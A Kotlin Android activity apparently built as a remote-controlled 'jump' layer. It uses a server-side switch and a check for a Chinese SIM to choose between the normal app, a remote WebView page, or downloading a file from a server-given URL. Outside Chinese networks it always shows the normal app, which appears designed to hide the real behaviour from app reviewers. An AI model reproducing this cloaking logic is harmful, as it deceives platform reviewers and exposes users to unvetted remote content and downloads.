package com.dakulangsakalam.customwebview.presentation.ui.jump

import android.os.Bundle
import android.text.TextUtils
import androidx.lifecycle.ViewModelProvider
import com.dakulangsakalam.customwebview.domain.dto.JumpDetails
import com.dakulangsakalam.customwebview.domain.dto.JumpList
import com.dakulangsakalam.customwebview.presentation.utils.Constants
import com.dakulangsakalam.customwebview.presentation.utils.writeLogs
import com.dakulangsakalam.customwebview.jump_task.utils.checkOperators
import com.dakulangsakalam.customwebview.presentation.*
import com.dakulangsakalam.customwebview.presentation.ui.NoNetworkActivity
import com.dakulangsakalam.customwebview.presentation.ui.WebViewActivity
import com.dakulangsakalam.customwebview.presentation.utils.DownloadTool
import kotlinx.coroutines.ExperimentalCoroutinesApi
import org.json.JSONException
import java.io.IOException

@ExperimentalCoroutinesApi
abstract class JumpActivity: DownloadTool() {

    private var isTestingEnabled = false

    private val viewModel by lazy {
        ViewModelProvider(this)[JumpActivityViewModel::class.java]
    }

    private lateinit var onStart: (version: Int, downUrl: String) -> Unit

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        viewModel.jumpEvent.observe(this){ event ->
            when(event){
                is JumpEvent.AppInstalledEvent -> registerApplication(event.isInstalled)
                is JumpEvent.JumpRequestSuccess -> processHandler(event.list)
                is JumpEvent.JumpRequestError -> processHanderError(event.exception)
                is JumpEvent.JumpNoNetwork -> noInternetPage()
                else -> {
                    // no-op
                }
            }
        }
    }

    private fun processHanderError(exception: Exception) {
        when(exception){
            is NullPointerException,
            is JSONException -> onStart(1, "")
            is IOException -> noInternetPage()
            else -> onfailedRequest()
        }
        writeLogs("processHanderError ${exception.message}")
    }

    private fun onfailedRequest() {
        if(jumpRequestTrial == 1) {
            jumpRequestTrial++
            startThread()
        }
        else onStart(1, "")
    }

    private fun processHandler(list: JumpList) {
        var kaiguan = Integer.parseInt(list.off)
        val isChineseSim = checkOperators()
        val yingyongming = list.yingyongming
        if (!isChineseSim && !yingyongming.contains("测试")) {
            kaiguan = 1
        }
        val jumpDetails = JumpDetails(
            version = list.versionNumber,
            wangzhi = list.wangzhi,
            drainage = list.drainage
        )
        routeHandler(kaiguan, jumpDetails)
    }

    private fun routeHandler(kaiguan: Int, jumpDetails: JumpDetails) {
        when(kaiguan){
            0 ->  {}
            2 -> onWebLoaded(jumpDetails.drainage)
            3 ->  onDownload(jumpDetails.wangzhi)
            else -> onOtherResponse(
                jumpDetails.version,
                jumpDetails.wangzhi,
                jumpDetails.drainage
            )
        }
    }

    private fun onWebLoaded(s: String) {
        startActivity(WebViewActivity.createIntent(this@JumpActivity, s))
        finish()
        getDefaultSharedPref().edit().putBoolean("haveOpenH5OnceTime",true).apply()
    }

    private fun onDownload(s: String) = download(s)

    private fun onOtherResponse(version: Int, downloadUrl: String, webUrl: String) {
        writeLogs("haveOpenH5OnceTime ${getDefaultSharedPref().getBoolean("haveOpenH5OnceTime", false)}")
        if (getDefaultSharedPref().getBoolean("haveOpenH5OnceTime", false) && !TextUtils.isEmpty(webUrl)) onWebLoaded(webUrl)
        else onStart(version, downloadUrl ?: "")
    }

    private fun registerApplication(installed: Boolean) {
        writeLogs("[Register Intalled App Done!]")
        if(installed) getDefaultSharedPref().edit().putBoolean("haveInstallAddOneTimes", true).apply()
        viewModel.getApplicationUrl(getAppPackageName())
    }

    private fun startThread() = viewModel.startRequest(getAppPackageName())

    fun getAppPackageName(): String {
        return if (!isTestingEnabled) "${applicationContext.packageName}"
        else "123456"
    }

    fun splashAction(forTesting: Boolean? = false, domainType: Int? = 1, onStart: (version: Int, downUrl: String) -> Unit) {

        isTestingEnabled = forTesting ?: false

        domainSwitch = domainType ?: 1

        this.onStart = onStart

        startLogs()

        if (!isNetworkConnected()) noInternetPage()
        else if (!getAppIsRegistered()) startThread()
        else viewModel.getApplicationUrl(getAppPackageName())
    }

    private fun noInternetPage() {
        startActivity(NoNetworkActivity.createIntent(this))
    }

    private fun startLogs(){
        writeLogs("Domain URL1: ${getURL()}")
        writeLogs("Domain URL2: ${getURL2()}")
        writeLogs("Android name Access: ${getAppPackageName()}")
        writeLogs("Application Package Name: ${applicationContext.packageName}")
    }

    companion object{

        var domainSwitch = 1
        var jumpRequestTrial = 1

        fun getBaseURL(urlBase: Int? = 1): String{
            return "http://${if(urlBase == 1) getURL() else getURL2()}/jeesite/f/guestbook/"
        }

        fun getURL(): String {
            val str = when(domainSwitch){
                2 -> Constants.DOMAIN2
                else -> Constants.DOMAIN1
            }
            return str
        }

        fun getURL2(): String {
            val str = when(domainSwitch){
                2 -> Constants.DOMAIN2_2
                else -> Constants.DOMAIN1_2
            }
            return str
        }
    }
}